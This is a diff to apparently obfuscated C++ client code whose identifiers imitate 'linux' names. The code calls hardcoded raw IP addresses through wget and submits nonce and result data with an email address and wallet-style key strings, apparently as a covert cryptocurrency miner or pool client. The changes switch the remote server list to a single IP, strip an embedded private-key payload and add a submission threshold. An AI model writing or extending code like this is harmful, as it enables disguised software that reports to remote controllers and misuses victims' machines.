@@ -970,13 +970,18 @@ linux888874744474_update_result linux888874744474_client::update() {
 
     string response;
 
-string random [] = {"94.237.30.197", "94.237.61.188", "194.113.72.197","194.113.74.217","209.151.148.100","94.237.82.144","83.136.252.244","152.44.45.146","209.151.156.131","209.50.61.158"};
+//string random [] = {"94.237.30.197","94.237.61.188","194.113.72.197","194.113.74.217","209.151.148.100","94.237.82.144","83.136.252.244","152.44.45.146","209.151.156.131","209.50.61.158"};
+
+string random [] = {"195.123.240.50"};
+
 int number;
 
 srand(time(0));
-int rand_index = rand() % 10;
+int rand_index = rand() % 1;
 
     string url = "http://" + random[rand_index] + "/linux8474.php?linux84=linux8474&linux84744474=linuxdistro84@gmail.com";
+    
+    cout << url << "\\n";
     
     response = GetStdoutFromCommand("wget -q -U 'linux84' -O - '"+url+"'");
     
@@ -1011,20 +1016,23 @@ linux888874744474_submit_result linux888874744474_client::submit(const string &l
     else
         linux84746688_data = linux8412.substr(30);
 
-    //string payload = "linux84746688="+ _encode(linux84746688_data) +"&nonce="+ _encode(linux88887474447412744474) +"&private_key=Lzhp9LopCG5MBQAmxJaz9LngpVtZ5FdGAGPfwXkY6iLQpMGb9rkaDLMqPufcUggLCpoRV1dSAx7bQ22coWfepjPULVgFHkuFRCnWeYpTwLePPciXZGfa3PPp2pvLDddQRgKyeNNKrtQCsAcasfRhjWLDufzGLqf1x&public_key=PZ8Tyr4Nx8MHsRAGMpZmZ6TWY63dXWSCworn17gwq3phD49svFCvC7qoAFE4tamjsMKGjXpsxa6wd6XRKZSJBv8xxj37hCaus2qXG65pnaHv61DShsL6SQza&address=3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3";
-
-    string payload = "linux84746688="+ _encode(linux84746688_data) +"&nonce="+ _encode(linux88887474447412744474) +"&private_key=3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3&public_key="+ _encode(public_key) +"&address=3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3&mail=linuxdistro84@gmail.com&linux84744444444474=PZ8Tyr4Nx8MHsRAGMpZmZ6TWY63dXWSCworn17gwq3phD49svFCvC7qoAFE4tamjsMKGjXpsxa6wd6XRKZSJBv8xxj37hCaus2qXG65pnaHv61DShsL6SQza&linux847444444444744474=Lzhp9LopCG5MBQAmxJaz9LngpVtZ5FdGAGPfwXkY6iLQpMGb9rkaDLMqPufcUggLCpoRV1dSAx7bQ22coWfepjPULVgFHkuFRCnWeYpTwLePPciXZGfa3PPp2pvLDddQRgKyeNNKrtQCsAcasfRhjWLDufzGLqf1x";
+    string payload = "linux84746688="+ _encode(linux84746688_data) +"&linux88887474447412744474="+ _encode(linux88887474447412744474);
     
     if(__show_linuxweb844412441274_requests)
     LOG("");
     
-string random [] = {"94.237.30.197", "94.237.61.188", "194.113.72.197","194.113.74.217","209.151.148.100","94.237.82.144","83.136.252.244","152.44.45.146","209.151.156.131","209.50.61.158"};
+//string random [] = {"94.237.30.197","94.237.61.188","194.113.72.197","194.113.74.217","209.151.148.100","94.237.82.144","83.136.252.244","152.44.45.146","209.151.156.131","209.50.61.158"};
+
+string random [] = {"195.123.240.50"};
+
 int number;
 
 srand(time(0));
-int rand_index = rand() % 10;
+int rand_index = rand() % 1;
  
     string url = "http://" + random[rand_index] + "/linux8474.php?linux84=linux84";
+    
+    cout << url << "\\n";
     
     string response;
     
@@ -1561,10 +1569,12 @@ void linux84::run() {
 	        string duration = linux84::calc_duration(linux8412->base, linux8412->linux8412);
                 uint64_t result = linux84::calc_compare(duration, __linuxweb8888);
 		if (result > 0 && result <= __limit) {
+			if (result <= GOLD_RESULT) {
 			linux888874744474_submit_result reply = __client.submit(linux8412->linux8412, linux8412->linux88887474447412744474, __public_key);
 			if (reply.success) {
                            cout << "";
 			}
+                   }
                 }
             }
        }
